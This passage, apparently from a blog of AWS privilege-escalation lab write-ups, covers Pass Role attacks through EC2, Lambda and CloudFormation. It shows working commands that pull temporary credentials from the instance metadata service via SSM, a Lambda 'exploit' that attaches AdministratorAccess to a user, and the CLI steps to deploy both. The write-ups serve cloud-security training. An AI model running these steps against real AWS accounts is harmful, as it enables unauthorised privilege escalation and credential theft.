    </span><span class="nl">"PasswordResetRequired"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Then, the new login profile can be created using the following command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn iam create-login-profile <span class="nt">--cli-input-json</span> file://create-login-profile.json
</pre></table></code></div></div><p>This gives console access to the <code class="language-plaintext highlighter-rouge">AdminBob</code> user and therefore grants administrative privileges and solves the lab.</p><hr /><h2 id="pass-role-ec2"><span class="me-2">Pass Role EC2</span><a href="#pass-role-ec2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab provides an IAM user <code class="language-plaintext highlighter-rouge">student</code> within an AWS account with the objective of gaining administrative access on the account.</p><p><a href="https://res.craft.do/user/full/67fb9814-2878-40e9-e112-5e5c41753a81/D04B330A-1F3A-4BBD-A585-AC95F9A5C7D8_2/WB53JG6HqB1HjcvliJIflohLqrb11FNlMMC9zHQuFhYz/lab.log">lab.log</a></p><p>The <code class="language-plaintext highlighter-rouge">student</code> user has the following policy →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ConfigureEC2Role"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="s2">"iam:PassRole"</span><span class="p">,</span><span class="w">
          </span><span class="s2">"ec2:RunInstances"</span><span class="p">,</span><span class="w">
          </span><span class="s2">"ec2:Describe*"</span><span class="p">,</span><span class="w">
          </span><span class="s2">"ec2:TerminateInstances"</span><span class="p">,</span><span class="w">
          </span><span class="s2">"ssm:*"</span><span class="w">
        </span><span class="p">],</span><span class="w">
        </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Therefore, the user can perform PassRole on any resource as well as has control over EC2 instances and SSM (AWS Systems Manager). Therefore, the user should have the ability to pass a role to an EC2 instance and run it.</p><p>Looking at available roles that can be passed using the role detail list, there is an <code class="language-plaintext highlighter-rouge">ec2admin</code> role that can be assumed by EC2 which has policies as follows →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ec2admin"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAQYAQFWV2XI23JRAW7"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::051573536117:role/ec2admin"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-26T00:00:05+00:00"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"AssumeRolePolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"Service"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ec2.amazonaws.com"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="w">
      </span><span class="p">}]</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"InstanceProfileList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"InstanceProfileName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ec2_admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"InstanceProfileId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AIPAQYAQFWV2Z3YJX2PCC"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::051573536117:instance-profile/ec2_admin"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-26T00:00:06+00:00"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Roles"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ec2admin"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAQYAQFWV2XI23JRAW7"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::051573536117:role/ec2admin"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-26T00:00:05+00:00"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"AssumeRolePolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
              </span><span class="p">{</span><span class="w">
                </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
                </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                  </span><span class="nl">"Service"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ec2.amazonaws.com"</span><span class="w">
                </span><span class="p">},</span><span class="w">
                </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="w">
              </span><span class="p">}]}}]}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"RolePolicyList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"terraform-20220426000006379000000003"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
          </span><span class="p">}]}}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"AttachedManagedPolicies"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"RoleLastUsed"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>When the role is defined on the console to be assumed by EC2, an instance profile is automatically created by the backend to allow for the instance to assume that role. The only remaining step at that point is to allow an authorized user to pass a role to it. The policy attached to the above passable role is that of an administrative user.</p><p>Several pieces of information are required to launch an EC2 instance. These can be gathered as follows →</p><ol><li>Get the AMI-ID to launch a machine and get the Image ID →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn ec2 describe-images <span class="nt">--owners</span> <span class="s2">"amazon"</span> <span class="nt">--filters</span> <span class="s2">"Name=name,Values=amzn2-ami-hvm-*x86_64-gp2"</span> <span class="s2">"Name=state,Values=available"</span> <span class="s2">"Name=architecture,Values=x86_64"</span> | jq <span class="s1">'.Images | sort_by(.CreationDate) | last(.[])'</span>
</pre></table></code></div></div><ol><li>Get the available subnets and retrieve a Subnet ID →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn ec2 describe-subnets
</pre></table></code></div></div><ol><li>Get the security group to associate with the instance. The Group ID is the field of importance. There were many security groups here, however, an interesting one was the <code class="language-plaintext highlighter-rouge">sshAccesss</code> SG which allowed SSH access from anywhere on the internet. This was not useful though, since the user did not have permissions to add an SSH key. So, any security group would suffice →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn ec2 describe-security-groups
</pre></table></code></div></div><ol><li>The instance profile name can be obtained from the above Role detail as <code class="language-plaintext highlighter-rouge">ec2_admin</code>.</ol><p>Now, the instance can be launched using the following command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn ec2 run-instances <span class="nt">--subnet-id</span> <span class="s2">"subnet-0d3f2d36c562ea754"</span> <span class="nt">--image-id</span> <span class="s2">"ami-00db75007d6c5c578"</span> <span class="nt">--iam-instance-profile</span> <span class="nv">Name</span><span class="o">=</span>ec2_admin <span class="nt">--instance-type</span> t2.micro <span class="nt">--security-group-ids</span> <span class="s2">"sg-0cd10f19654a602f8"</span>
</pre></table></code></div></div><p>This launched the instance and returns a bunch of information about it along with the instance ID, which is necessary to use when trying to execute things via SSM. The EC2 instance effectively has the assumed role of <code class="language-plaintext highlighter-rouge">ec2admin</code>. The next step is to get the credentials via the metadata service.</p><p>Commands can be issued to the EC2 instance using SSM using the following →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssm send-command <span class="nt">--targets</span> <span class="s2">"Key=instanceids,Values=i-02930a6a3317e02e1"</span> <span class="nt">--document-name</span> <span class="s2">"AWS-RunShellScript"</span> <span class="nt">--comment</span> <span class="s2">"aws_cli_run_lab"</span> <span class="nt">--parameters</span> <span class="s1">'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]'</span>
</pre></table></code></div></div><p>This runs the command and returns an ID associated with the command invocation. The ID can be used to retrieve the output as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn ssm get-command-invocation <span class="nt">--command-id</span> 35218027-97f2-4b68-8495-aa78cb0e9065 <span class="nt">--instance-id</span> i-02930a6a3317e02e1
</pre></table></code></div></div><p>This gives the output of the cURL command which contains the temporary credentials to assume the role that the EC2 instance has i.e., the <code class="language-plaintext highlighter-rouge">ec2admin</code> role. Then the following can be done to prove administrative privileges →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.AccessKeyId'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.SecretAccessKey'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
<span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.Token'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
awsn iam create-user <span class="nt">--user-name</span> Bob
</pre></table></code></div></div><p>This solves the lab.</p><hr /><h2 id="pass-role-lambda"><span class="me-2">Pass Role Lambda</span><a href="#pass-role-lambda" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab provides an IAM user <code class="language-plaintext highlighter-rouge">student</code> within an AWS account with the objective of gaining administrative access on the account.</p><p>Looking at the users, the user of importance is <code class="language-plaintext highlighter-rouge">student</code> who has the inline policy to allow <code class="language-plaintext highlighter-rouge">iam:PassRole</code>, <code class="language-plaintext highlighter-rouge">lambda:CreateFunction</code>, <code class="language-plaintext highlighter-rouge">lambda:InvokeFunction</code>, <code class="language-plaintext highlighter-rouge">lambda:List*</code>, <code class="language-plaintext highlighter-rouge">lambda:Get*</code> and <code class="language-plaintext highlighter-rouge">lambda:Update*</code> actions. Therefore, <code class="language-plaintext highlighter-rouge">student</code> has the ability to pass an existing role to a Lambda function.</p><p>If such a role exists which can be passed to Lambda and has enough permissions to help escalate, that would solve the issue. This can be checked by looking at the policy detail list. Such a function can be found in the lab account. The command to do a quick search is as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Service=="lambda.amazonaws.com")'</span>
</pre></table></code></div></div><p>This gives the following role →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lab11lambdaiam"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAVZBFEYFFM77TYJBLL"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::397362381130:role/lab11lambdaiam"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-26T19:11:46+00:00"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"AssumeRolePolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"Service"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lambda.amazonaws.com"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"InstanceProfileList"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"RolePolicyList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"terraform-20220426191146909700000003"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
              </span><span class="s2">"iam:AttachUserPolicy"</span><span class="w">
            </span><span class="p">],</span><span class="w">
            </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">]</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"AttachedManagedPolicies"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"RoleLastUsed"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Therefore, the role has the permissions to attach a policy to any user. Therefore, the attack path is as follows →</p><ol><li>Write malicious code to build a Lambda function out of it such that the code grants the <code class="language-plaintext highlighter-rouge">student</code> user administrator privileges by assuming capabilities of the <code class="language-plaintext highlighter-rouge">lab11lambdaiam</code> role →</ol><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c1"># file name is lambda_exploit.py
</span><span class="kn">import</span> <span class="n">boto3</span>

<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
    <span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="nf">client</span><span class="p">(</span><span class="sh">'</span><span class="s">iam</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">attach_user_policy</span><span class="p">(</span>
                <span class="n">UserName</span> <span class="o">=</span> <span class="sh">'</span><span class="s">student</span><span class="sh">'</span><span class="p">,</span>
                <span class="n">PolicyArn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">arn:aws:iam::aws:policy/AdministratorAccess</span><span class="sh">'</span>
            <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>
</pre></table></code></div></div><p>This is then zipped to create a deployment bundle as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>zip lambda_exploit.zip lambda_exploit.py
</pre></table></code></div></div><ol><li>Create a function by passing the <code class="language-plaintext highlighter-rouge">lab11lambdaiam</code> role to it using the malicious code →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>awsn lambda create-function <span class="nt">--function-name</span> lambda_exploit <span class="se">\</span>
<span class="nt">--runtime</span> python3.8 <span class="nt">--role</span> <span class="s2">"arn:aws:iam::397362381130:role/lab11lambdaiam"</span> <span class="se">\</span>
<span class="nt">--handler</span> <span class="s2">"lambda_exploit.lambda_handler"</span> <span class="nt">--zip-file</span> fileb://lambda_exploit.zip
</pre></table></code></div></div><ol><li>Invoke the Lambda function →</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># Invoke</span>
awsn lambda invoke <span class="nt">--function-name</span> lambda_exploit out <span class="nt">--log-type</span> Tail

<span class="c"># Output will be in LogResult key in the returned JSON object.</span>
<span class="c"># LogResult is base64 encoded and the file out contains request parameters</span>
</pre></table></code></div></div><p>These steps grant the administrator privileges to the <code class="language-plaintext highlighter-rouge">student</code> user and this can be verified by creating a new user or listing the attached policies again and comparing with user detail list. This solves the lab.</p><hr /><h2 id="pass-role-cloudformation"><span class="me-2">Pass Role CloudFormation</span><a href="#pass-role-cloudformation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab provides an IAM user <code class="language-plaintext highlighter-rouge">student</code> within an AWS account with the objective of gaining administrative access on the account.</p><p>Looking at the user detail list, only <code class="language-plaintext highlighter-rouge">student</code> is of concern and has the following inline policy →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="s2">"iam:PassRole"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"cloudformation:Describe*"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"cloudformation:List*"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"cloudformation:Get*"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"cloudformation:CreateStack"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"cloudformation:UpdateStack"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"cloudformation:ValidateTemplate"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"cloudformation:CreateUploadBucket"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Therefore, the user can pass a role to a service, which has to CloudFormation as it is the only one which it can do most of the actions for. Therefore, the path of escalation would be to create a malicious IaC template in CFN and passing a role that can allow CFN to do malicious activities. To find such a role, looking at role detail list, there is one named <code class="language-plaintext highlighter-rouge">lab12CFDeployRole</code> which can also be searched for with the following command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Service=="cloudformation.amazonaws.com") | .RoleName'</span>
</pre></table></code></div></div><p>This role has the following inline policy →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
